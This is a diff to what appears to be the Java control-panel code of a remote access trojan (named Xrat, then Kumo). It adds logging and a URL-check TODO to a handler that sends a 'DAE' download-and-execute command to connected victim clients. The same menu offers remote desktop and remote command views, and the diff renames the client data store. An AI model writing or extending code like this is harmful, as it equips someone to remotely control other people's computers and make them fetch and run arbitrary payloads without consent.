@@ -4,7 +4,8 @@ import GUI.Controller;
 import GUI.Views.DownloadAndExecuteView;
 import GUI.Views.RemoteDesktopView;
 import GUI.Views.SendCommandView;
-import GUI.Views.WebDeliveryView;
+import Logger.Level;
+import Logger.Logger;
 import Server.ClientObject;
 import Server.Data.PseudoBase;
 import Server.Data.Repository;
@@ -87,7 +88,9 @@ class IPContextMenu implements Repository {
             DownloadAndExecuteView.getDownloadButton().setOnAction(a -> {
                 if (clientObject != null && clientObject.getClient().isConnected() && clientObject.getOnlineStatus().equals("Online")) {
                     try {
+                        // TODO put in url regex check
                         String url = DownloadAndExecuteView.getUrlFieldValue();
+                        Logger.log(Level.INFO, "Sending DaE with: " + url);
                         clientObject.clientCommunicate("DAE " + url);
                         //clientObject.clientCommunicate("CMD " + SendCommandView.getTextField().getText());
                     } catch (IOException e1) {
@@ -115,7 +118,7 @@ class IPContextMenu implements Repository {
                 }
             }
             assert clientObject != null;
-            PseudoBase.getXratData().remove(clientObject.getIP());
+            PseudoBase.getKumoData().remove(clientObject.getIP());
             CONNECTIONS.remove(clientObject.getIP());
             Controller.updateStats();
             Controller.updateTable();
